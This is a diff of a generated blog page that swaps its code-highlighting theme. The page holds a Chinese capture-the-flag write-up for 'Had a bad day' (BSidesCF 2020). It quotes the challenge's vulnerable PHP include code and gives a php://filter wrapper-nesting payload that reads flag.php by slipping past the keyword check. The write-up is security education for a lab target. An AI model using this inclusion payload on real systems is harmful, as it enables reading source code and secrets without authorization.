@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      162 字
+      149 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      4
        分钟
     </span>
   
@@ -240,19 +248,19 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BSidesCF 2020]Had a bad day<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f5f5f1cac583c37f.png" srcset="/img/loading.gif">   </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>点击其中一个后会出来一张图片，而且URL变成<code>http://3c2d7f7c-2f24-42ca-84de-dfa013335bf4.node3.buuoj.cn/index.php?category=woofers</code><br>本来以为是SQL注入，加了个<code>&#39;</code><br>回显：<img src="https://ftp.bmp.ovh/imgs/2021/03/d6e58884d2fe94c0.png" srcset="/img/loading.gif"><br>是文件包含<br><code>php://filter/read=convert.base64-encode/source=flag.php</code><br>回显：<code>Sorry, we currently only support woofers and meowers.</code><br>试一下<code>index</code><br>成功读出    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$file = $_GET[<span class="hljs-string">&#x27;category&#x27;</span>];
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($file))
-&#123;
-	<span class="hljs-keyword">if</span>( strpos( $file, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( $file, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( $file, <span class="hljs-string">&quot;index&quot;</span>))&#123;
-		<span class="hljs-keyword">include</span> ($file . <span class="hljs-string">&#x27;.php&#x27;</span>);
-	&#125;
-	<span class="hljs-keyword">else</span>&#123;
-		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;
-	&#125;
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean constant">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"meowers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean constant">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>  </code></pre></code></pre>
 <p>然后没招了<br>看了WP<br><code>伪协议嵌套</code>       </p>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>php://filter/read=convert.base64-encode/index/resource=flag</code></p>
 
@@ -399,6 +407,8 @@ $file = $_GET[<span class="hljs-string">&#x27;category&#x27;</span>];
 
 
 
+  
+    
   
 
 
